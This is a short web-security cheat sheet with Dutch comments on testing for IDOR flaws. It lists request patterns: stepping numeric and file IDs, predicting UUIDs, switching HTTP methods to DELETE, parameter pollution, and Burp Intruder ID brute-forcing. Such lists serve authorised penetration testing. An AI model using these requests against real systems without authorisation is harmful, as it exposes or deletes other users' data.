# IDOR - Insecure Direct Object Reference
# === Numerieke ID manipulatie ===
# Origineel: GET /api/user/profile?id=1337
# Probeer: GET /api/user/profile?id=1338
# GET /api/user/profile?id=1336
# GET /api/user/profile?id=1
# === Document/file IDOR ===
# Origineel: GET /docs/?f=report_1337.pdf
# Probeer: GET /docs/?f=report_1338.pdf
# GET /docs/?f=report_1.pdf
# === UUID/GUID IDOR ===
# Soms voorspelbaar (v1 UUID = timestamp-based)
# Zoek UUIDs in: HTML source, API responses, JavaScript files
# === HTTP method IDOR ===
# GET mag niet, maar PUT/DELETE/PATCH wel?
# GET /api/user/1337 -> 403
# DELETE /api/user/1337 -> 200
# === Parameter pollution ===
# GET /api/user?id=1337&id=1338
# GET /api/user?id[]=1337&id[]=1338
# === Burp Intruder brute-force ===
# Payload type: Numbers, range 1-10000
# Filter op: response size, status code, specifieke string
